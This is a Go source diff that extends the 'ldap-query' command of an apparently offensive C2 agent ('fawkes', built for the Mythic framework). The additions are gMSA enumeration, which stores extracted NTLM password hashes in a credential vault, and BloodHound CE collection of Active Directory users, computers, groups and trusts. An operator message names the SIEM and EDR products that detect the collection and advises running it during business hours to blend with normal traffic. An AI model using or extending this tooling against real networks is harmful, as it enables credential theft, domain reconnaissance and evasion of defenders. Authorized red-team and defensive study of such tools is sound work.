@@ -1,6 +1,7 @@
 package agentfunctions
 
 import (
+	"encoding/json"
 	"fmt"
 	"path/filepath"
 	"strings"
@@ -13,9 +14,9 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "ldap-query",
-		Description:         "Query Active Directory via LDAP. Supports preset queries (users, computers, groups, domain-admins, admins, SPNs, AS-REP roastable, disabled, GPOs, OUs, password-never-expires, trusts, unconstrained/constrained delegation) and custom LDAP filters.",
-		HelpString:          "ldap-query -action users -server 192.168.1.1\nldap-query -action trusts -server dc01\nldap-query -action unconstrained -server dc01\nldap-query -action constrained -server dc01\nldap-query -action query -server dc01 -filter \"(servicePrincipalName=*MSSQLSvc*)\"",
-		Version:             3,
+		Description:         "Query Active Directory via LDAP. Supports preset queries (users, computers, groups, domain-admins, admins, SPNs, AS-REP roastable, disabled, GPOs, OUs, password-never-expires, trusts, unconstrained/constrained delegation), DACL/gMSA enumeration, BloodHound CE collection, and custom LDAP filters.",
+		HelpString:          "ldap-query -action users -server 192.168.1.1\nldap-query -action trusts -server dc01\nldap-query -action bloodhound -server dc01 -limit 500\nldap-query -action query -server dc01 -filter \"(servicePrincipalName=*MSSQLSvc*)\"",
+		Version:             4,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1087.002", "T1069.002"},
 		CommandAttributes: agentstructs.CommandAttribute{
@@ -33,7 +34,7 @@ func init() {
 				ModalDisplayName: "Query Type",
 				Description:      "Preset query or custom filter",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"users", "computers", "groups", "domain-admins", "spns", "asrep", "admins", "disabled", "gpo", "ou", "password-never-expires", "trusts", "unconstrained", "constrained", "dacl", "query", "enum-chain"},
+				Choices:          []string{"users", "computers", "groups", "domain-admins", "spns", "asrep", "admins", "disabled", "gpo", "ou", "password-never-expires", "trusts", "unconstrained", "constrained", "dacl", "gmsa", "bloodhound", "query", "enum-chain"},
 				DefaultValue:     "users",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -159,6 +160,8 @@ func init() {
 				msg += " Querying privileged/sensitive attributes — may trigger AD honeypot or LDAP monitoring rules for reconnaissance."
 			case "dacl":
 				msg += " DACL enumeration reads security descriptors — some EDR products monitor bulk DACL reads as BloodHound-like behavior."
+			case "bloodhound":
+				msg += " BloodHound collection performs bulk enumeration of users, computers, groups, OUs, GPOs, and trusts — generates significant LDAP traffic (thousands of queries). Modern SIEM detects this pattern (MDI, ATA, Crowdstrike Falcon). Consider running during business hours to blend with normal AD traffic."
 			default:
 				msg += " LDAP queries generate directory service access logs (Event ID 4662). High-volume queries may trigger anomaly detection."
 			}
@@ -239,6 +242,9 @@ func init() {
 				displayMsg += fmt.Sprintf(" filter=%s", filter)
 			} else if action == "dacl" && filter != "" {
 				displayMsg = fmt.Sprintf("LDAP DACL on %s target=%s", server, filter)
+			} else if action == "bloodhound" {
+				limit, _ := taskData.Args.GetNumberArg("limit")
+				displayMsg = fmt.Sprintf("BloodHound CE collection on %s (limit=%d)", server, int(limit))
 			}
 			response.DisplayParams = &displayMsg
 
@@ -301,10 +307,45 @@ func init() {
 						}
 					}
 				}
+			case "gmsa":
+				// Register extracted gMSA NTLM hashes in the credential vault
+				processGMSACredentials(processResponse.TaskData.Task.ID, responseText, server)
+			case "bloodhound":
+				processBloodHoundResults(processResponse.TaskData.Task.ID, responseText, server)
 			}
 			return response
 		},
 	})
+}
+
+// parseComputerNames extracts AD computer account names from LDAP query output.
+func parseComputerNames(responseText string) []string {
+	var computers []string
+	for _, line := range strings.Split(responseText, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.Contains(trimmed, "$") && !strings.HasPrefix(trimmed, "=") && !strings.HasPrefix(trimmed, "-") {
+			fields := strings.Fields(trimmed)
+			if len(fields) > 0 {
+				computers = append(computers, fields[0])
+			}
+		}
+	}
+	return computers
+}
+
+// parseTrustDomains extracts AD trust domain names from LDAP query output.
+func parseTrustDomains(responseText string) []string {
+	var domains []string
+	for _, line := range strings.Split(responseText, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.Contains(trimmed, ".") && !strings.HasPrefix(trimmed, "=") && !strings.HasPrefix(trimmed, "-") && !strings.HasPrefix(trimmed, "Trust") {
+			fields := strings.Fields(trimmed)
+			if len(fields) > 0 {
+				domains = append(domains, fields[0])
+			}
+		}
+	}
+	return domains
 }
 
 // ldapEnumChainCompleteFunc handles subtask completion for the AD enum chain.
@@ -373,4 +414,70 @@ var ldapEnumChainCompleteFunc = func(taskData *agentstructs.PTTaskMessageAllData
 
 	logging.LogInfo("AD Enum Chain completed", "success", successCount, "errors", errorCount)
 	return response
+}
+
+// processGMSACredentials parses gMSA output JSON and registers extracted NTLM hashes
+// in the Mythic credential vault.
+func processGMSACredentials(taskID int, responseText string, server string) {
+	var output struct {
+		Accounts []struct {
+			SAMAccountName string `json:"sAMAccountName"`
+			NTLMHash       string `json:"ntlm_hash"`
+		} `json:"accounts"`
+	}
+	if err := json.Unmarshal([]byte(responseText), &output); err != nil {
+		return
+	}
+
+	var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+	for _, acct := range output.Accounts {
+		if acct.NTLMHash == "" {
+			continue
+		}
+		creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+			CredentialType: "hash",
+			Account:        acct.SAMAccountName,
+			Credential:     acct.NTLMHash,
+			Realm:          server,
+			Comment:        "gMSA NTLM hash extracted via ldap-query gmsa",
+		})
+		mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
+			TaskID:           taskID,
+			BaseArtifactType: "Credential Access",
+			ArtifactMessage:  fmt.Sprintf("gMSA password extracted: %s", acct.SAMAccountName),
+		})
+	}
+	registerCredentials(taskID, creds)
+}
+
+func processBloodHoundResults(taskID int, responseText string, server string) {
+	var output struct {
+		Summary struct {
+			Domain    string `json:"domain"`
+			DomainSID string `json:"domain_sid"`
+			Users     int    `json:"users"`
+			Computers int    `json:"computers"`
+			Groups    int    `json:"groups"`
+			OUs       int    `json:"ous"`
+			GPOs      int    `json:"gpos"`
+			Trusts    int    `json:"trusts"`
+		} `json:"summary"`
+	}
+	if err := json.Unmarshal([]byte(responseText), &output); err != nil {
+		return
+	}
+
+	mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
+		TaskID:           taskID,
+		BaseArtifactType: "Host Discovery",
+		ArtifactMessage: fmt.Sprintf("BloodHound CE collection: %s (SID: %s) — %d users, %d computers, %d groups, %d OUs, %d GPOs, %d trusts",
+			output.Summary.Domain, output.Summary.DomainSID,
+			output.Summary.Users, output.Summary.Computers, output.Summary.Groups,
+			output.Summary.OUs, output.Summary.GPOs, output.Summary.Trusts),
+	})
+
+	mythicrpc.SendMythicRPCOperationEventLogCreate(mythicrpc.MythicRPCOperationEventLogCreateMessage{
+		TaskID:  &taskID,
+		Message: fmt.Sprintf("[BloodHound] AD collection complete for %s: %d users, %d computers, %d groups, %d OUs, %d GPOs, %d trusts. Download task output as JSON and import into BloodHound CE.", output.Summary.Domain, output.Summary.Users, output.Summary.Computers, output.Summary.Groups, output.Summary.OUs, output.Summary.GPOs, output.Summary.Trusts),
+	})
 }
